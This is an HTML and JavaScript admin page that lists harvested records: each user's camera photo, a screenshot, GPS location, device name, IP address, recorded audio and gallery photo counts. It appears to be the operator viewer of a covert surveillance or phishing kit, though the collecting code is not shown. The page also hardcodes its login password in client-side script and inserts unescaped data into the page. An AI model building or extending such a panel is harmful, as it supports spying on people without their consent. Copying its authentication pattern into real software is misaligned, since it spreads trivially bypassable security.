<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Segoe UI',Arial; background:#1a1a2e; padding:20px; }
        .container { max-width:1200px; margin:auto; }
        .login-box { background:white; border-radius:15px; padding:40px; max-width:350px; margin:50px auto; text-align:center; }
        .login-box input { width:100%; padding:12px; margin:10px 0; border:2px solid #ddd; border-radius:8px; }
        .login-box button { width:100%; padding:12px; background:#6c5ce7; color:white; border:none; border-radius:8px; font-size:16px; cursor:pointer; }
        .login-box .error { color:#d63031; margin-top:10px; }
        .gallery { display:none; }
        header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; margin-bottom:20px; }
        h2 { color:white; }
        .stats { color:#aaa; }
        .stats span { color:#6c5ce7; font-size:20px; }
        .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:20px; }
        .card { background:white; border-radius:12px; overflow:hidden; }
        .card .img-grid { display:grid; grid-template-columns:1fr 1fr; }
        .card .img-grid img { width:100%; height:140px; object-fit:cover; cursor:pointer; }
        .card .info { padding:12px; }
        .card .info .time { color:#666; font-size:12px; }
        .card .info .delete-btn { padding:5px 12px; background:#ff7675; color:white; border:none; border-radius:6px; cursor:pointer; margin-top:8px; }
        .card .info .badge { display:inline-block; padding:2px 10px; border-radius:10px; font-size:10px; background:#6c5ce7; color:white; }
        .card .info .gallery-badge { background:#00b894; }
        .loading, .no-data { color:white; text-align:center; padding:40px; font-size:18px; }
        .audio-player { margin-top:8px; padding:8px; background:#f0f0f0; border-radius:8px; }
        .audio-player audio { width:100%; height:30px; }
    </style>
</head>
<body>
<div class="container">

<div class="login-box" id="loginBox">
    <h2>🔐 Admin</h2>
    <input type="password" id="passwordInput" placeholder="Password" />
    <button onclick="login()">Unlock</button>
    <div class="error" id="loginError"></div>
</div>

<div class="gallery" id="gallery">
    <header>
        <div><h2>📊 Full Gallery</h2><div class="stats">Total: <span id="total">0</span></div></div>
        <div>
            <button onclick="logout()" style="padding:8px 18px;background:#d63031;color:white;border:none;border-radius:8px;cursor:pointer;">Logout</button>
            <button onclick="loadData()" style="padding:8px 18px;background:#6c5ce7;color:white;border:none;border-radius:8px;cursor:pointer;">Refresh</button>
        </div>
    </header>
    <div class="grid" id="grid"></div>
</div>

<script>
const PASSWORD = 'admin123#@!';

function login() {
    const pwd = document.getElementById('passwordInput').value;
    if (pwd === PASSWORD) {
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('gallery').style.display = 'block';
        loadData();
    } else {
        document.getElementById('loginError').textContent = 'Wrong password!';
    }
}

function logout() {
    document.getElementById('loginBox').style.display = 'block';
    document.getElementById('gallery').style.display = 'none';
    document.getElementById('passwordInput').value = '';
}

async function loadData() {
    const grid = document.getElementById('grid');
    const total = document.getElementById('total');
    grid.innerHTML = '<div class="loading">⏳ Loading...</div>';
    
    try {
        const res = await fetch('/api/admin/get-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD })
        });
        const data = await res.json();
        
        if (!data.success) {
            grid.innerHTML = '<div class="no-data">❌ ' + data.message + '</div>';
            return;
        }
        
        total.textContent = data.count || 0;
        
        if (!data.data || data.data.length === 0) {
            grid.innerHTML = '<div class="no-data">📭 No data</div>';
            return;
        }
        
        grid.innerHTML = '';
        
        data.data.forEach(item => {
            const card = document.createElement('div');
            card.className = 'card';
            
            // Audio player
            let audioHTML = '';
            if (item.audioData && item.audioData !== 'null' && item.audioData !== null) {
                audioHTML = `
                    <div class="audio-player">
                        <audio controls>
                            <source src="${item.audioData}" type="audio/webm">
                        </audio>
                    </div>
                `;
            }
            
            // Gallery badge
            let galleryBadge = '';
            if (item.type === 'gallery') {
                galleryBadge = '<span class="badge gallery-badge">📸 Gallery</span>';
            }
            
            // Behavior data
            let behaviorText = '';
            if (item.behaviorData && item.behaviorData.galleryPhotos > 0) {
                behaviorText = `📸 Gallery: ${item.behaviorData.galleryPhotos} photos`;
            }
            
            card.innerHTML = `
                <div class="img-grid">
                    <img src="${item.userPhoto || item.cameraImage || item.image || '#'}" onclick="window.open(this.src)" title="User Photo" />
                    <img src="${item.screenshot || '#'}" onclick="window.open(this.src)" title="Screenshot" />
                </div>
                <div class="info">
                    <div>📍 ${item.location?.lat?.toFixed(4) || 0}, ${item.location?.lng?.toFixed(4) || 0}</div>
                    <div class="time">🕐 ${new Date(item.timestamp).toLocaleString()}</div>
                    <div>📱 ${item.deviceDetails?.deviceName || 'Unknown'} ${galleryBadge}</div>
                    <div>📡 IP: ${item.ipAddress || 'Unknown'}</div>
                    ${behaviorText ? `<div>${behaviorText}</div>` : ''}
                    ${audioHTML}
                    <button class="delete-btn" onclick="deleteData('${item._id}')">🗑️ Delete</button>
                </div>
            `;
            grid.appendChild(card);
        });
    } catch(err) {
        grid.innerHTML = '<div class="no-data">❌ Error: ' + err.message + '</div>';
    }
}

async function deleteData(id) {
    if (!confirm('Delete?')) return;
    try {
        await fetch('/api/admin/delete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD, id })
        });
        loadData();
    } catch(err) {
        alert('Error: ' + err.message);
    }
}

document.getElementById('passwordInput').addEventListener('keypress', e => {
    if (e.key === 'Enter') login();
});
</script>
</body>
</html>
